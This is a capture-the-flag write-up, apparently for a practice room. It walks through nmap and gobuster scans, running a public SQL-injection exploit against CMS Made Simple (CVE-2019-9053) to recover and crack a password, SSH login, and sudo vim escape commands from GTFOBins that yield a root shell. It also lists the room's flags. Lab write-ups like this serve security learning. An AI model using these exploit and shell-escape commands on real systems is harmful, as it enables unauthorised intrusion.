@@ -1,0 +1,124 @@
+This challenge has severak questions that need to be answered.
+	-How many services are running under port 1000?
+	-what is running on the higher port?
+	-whats the CVE you're using against the application?	
+	-To what kind of vulnerability is the application vulnerable?
+	-whats the password?
+	-Where can you login with the details obtained?
+	-whats the user flag?
+	-is there any other user in the home directory? Whats the name?
+	-What can you leverage to sdpawn a privileged shell?
+	-Whats the root flag?
+
+To start with i will add the ip address to the /etc/hosts file and then perform an nmap scan
+nmap target -A -T4
+It showed 3 open ports
+
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.129.221
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+This allows use to answer the first few questions
+	-How many services are running under port 1000? 2
+	-What is the higher port? ssh
+
+Since port 80 is open we can assume there is a website.  Opening up the website loads "APache2 Ubuntu Default Page"
+I inspected the page html but didnt find anthing interesting.
+
+I decided to run a gobuster scan
+
+gobuster dir -u target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://target
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/simple               (Status: 301) [Size: 301] [--> http://target/simple/]
+/server-status        (Status: 403) [Size: 294]
+Progress: 218275 / 218276 (100.00%)
+===============================================================
+Finished
+==============
+
+I went back to the website and checked out the /simple subdomnain.  This lead to a page about 'cms made simple'.  Googling this, and 'cve"
+gave me the answer to the next two questions. I downloaded the CVE, a python script called "46635.py"
+
+	-Whats the CVE you're using against the application? CVE-2019-9053
+	-To what kind of vulnerability is the application vulnerable? sqli
+
+Back on the cms made simple page I found a php login form.  This may or not be related to the challenge.
+
+I attempted to run the exploit.  First I opened it up in nano which told me the arguments I need to run it.  It took some tria and error to 
+get running.  The script will not run with "python3" only "python", and I had to install termcolor to get it to work
+
+python  46635.py -u http://10.10.137.133/simple -c -w best110.txt
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+
+Using the credentials I found i was about to log on to the system using ssh, which is the answer to the next question.
+
+	-Where can you login with the details obtained? ssh	
+
+Once I was logged in i used to the ls command which revealed a single file which contained a flag, user.txt.  Then by using the cd .. command I was 
+I was able to go back into the /home directory which revealed another user
+
+	-Whats the user flag? G00d j0b, keep up!
+	-Is there any other user in the home directory? what's its name? Sunbath
+It should be noted that the flag was not in the usual THM{EXAMPLE} format.
+
+I ran the sudo -l command and found that the only command I can run with sudo priviledges is Vim.
+	-WHat can you leverage to spawn a priviledged shell? vim
+I went to https://gtfobins.github.io/# clicked on sudo and went down the list to vim an found sudo was highlighted.  I clicked on it which gave 
+me the following 
+
+Sudo
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+sudo vim -c ':!/bin/sh'
+This requires that vim is compiled with Python support. Prepend :py3 for Python 3.
+
+sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+This requires that vim is compiled with Lua support.
+
+sudo vim -c ':lua os.execute("reset; exec sh")'
+
+
+I typed in a modified version of the first command, using bash instead.  It gave me root access
+
+vim -c ':!/bin/bash
+
+I went to the root folder and found root.txt which allowed me to answer the final questions
+	-Whats the root flag? W3ll d0n3. You made it!
+
